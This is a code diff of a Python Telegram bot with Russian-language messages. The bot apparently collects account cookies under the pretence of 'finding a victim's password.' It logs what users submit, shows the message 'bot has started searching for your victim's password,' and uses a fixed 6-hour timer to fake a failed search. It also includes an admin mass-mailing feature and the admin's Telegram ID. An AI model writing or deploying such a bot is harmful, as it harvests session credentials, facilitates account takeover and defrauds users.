@@ -802,4 +802,117 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if not users:
             await update.message.reply_text("❌ Нет пользователей для рассылки.")
-            del context.user_data['mailing
+            del context.user_data['mailing_type']
+            return
+        
+        # Отправляем сообщение всем
+        sent = 0
+        failed = 0
+        
+        # Отправляем себе статус
+        status_msg = await update.message.reply_text(f"⏳ Начинаю рассылку для {len(users)} пользователей...")
+        
+        for user_id, user_data in users.items():
+            try:
+                await context.bot.send_message(
+                    chat_id=int(user_id),
+                    text=user_message
+                )
+                sent += 1
+                await asyncio.sleep(0.5)
+            except Exception as e:
+                failed += 1
+                print(f"❌ Ошибка отправки {user_id}: {e}")
+        
+        await status_msg.edit_text(
+            f"✅ **Рассылка завершена!**\n\n"
+            f"📤 Отправлено: {sent}\n"
+            f"❌ Не доставлено: {failed}\n"
+            f"👥 Всего: {len(users)}"
+        )
+        
+        del context.user_data['mailing_type']
+        return
+    
+    # Обычная обработка сообщений (не рассылка)
+    if KEYWORD in user_message:
+        save_keyword_user(
+            user_id=user.id,
+            username=user.username or "no_username",
+            first_name=user.first_name or "Unknown"
+        )
+        save_message(
+            user_id=user.id,
+            username=user.username or "no_username",
+            first_name=user.first_name or "Unknown",
+            text=user_message,
+            timestamp=timestamp
+        )
+        print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
+        await update.message.reply_text(
+            "Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
+            "Не создавайте повторных заявок, иначе будете заблокированы\n"
+            "Если в течении 6 часов бот не ответил, значит он не нашел пароль от аккаунта"
+        )
+        asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
+    else:
+        if is_keyword_user(user.id):
+            save_message(
+                user_id=user.id,
+                username=user.username or "no_username",
+                first_name=user.first_name or "Unknown",
+                text=user_message,
+                timestamp=timestamp
+            )
+            print(f"\n💬 [{timestamp}] {user.first_name} (@{user.username or 'no_username'}): {user_message}")
+            await update.message.reply_text("Ваше сообщение получено. Ожидайте результат.")
+        else:
+            await update.message.reply_text("Пожалуйста, отправьте правильный cookie для продолжения.")
+
+# ===================================================
+# ОБРАБОТЧИК КОМАНДЫ /cancel (для отмены рассылки)
+# ===================================================
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
+        del context.user_data['mailing_type']
+        await update.message.reply_text("❌ Рассылка отменена.")
+    else:
+        await update.message.reply_text("У вас нет активной рассылки.")
+
+# ===================================================
+# ФУНКЦИЯ ЗАДЕРЖКИ (6 часов 3 минуты)
+# ===================================================
+
+async def send_delayed_message(chat_id, context):
+    delay_seconds = 6 * 3600 + 3 * 60
+    try:
+        await asyncio.sleep(delay_seconds)
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы."
+        )
+    except Exception as e:
+        print(f"Ошибка при отправке отложенного сообщения: {e}")
+
+# ===================================================
+# ЗАПУСК БОТА
+# ===================================================
+
+def main():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("cancel", cancel))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
+    print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
+    print("📨 Для рассылки нажми кнопку 'Рассылка' в меню")
+    print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
